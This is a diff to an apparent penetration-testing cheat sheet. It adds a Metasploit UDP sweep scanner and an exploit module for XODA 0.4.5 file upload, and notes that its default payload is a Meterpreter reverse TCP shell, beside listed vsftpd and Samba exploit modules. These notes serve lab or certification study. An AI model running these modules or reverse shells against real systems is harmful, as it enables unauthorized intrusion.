@@ -111,9 +111,8 @@ db_import results
 db_nmap -Pn -sV <ip>
 ```
 ```
-search type:auxiliary portscan
-
 use auxiliary/scanner/portscan/tcp
+use auxiliary/scanner/discovery/udp_sweep
 ```
 
 # 2 Exploitation
@@ -129,6 +128,7 @@ use auxiliary/scanner/portscan/tcp
 - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
 - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
 - [vsftpd 2.3.4](#vsftpd-234)
+- [XODA 0.4.5](#XODA-045)
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
 ## ARP Poisoning
@@ -258,6 +258,12 @@ use exploit/linux/samba/is_known_pipename
 ```
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
+
+## XODA 0.4.5
+```
+use exploit/unix/webapp/xoda_file_upload
+```
+- Default payload is `php/meterpreter/reverse_tcp`.
 
 ## Windows Cross-Compilation
 ```
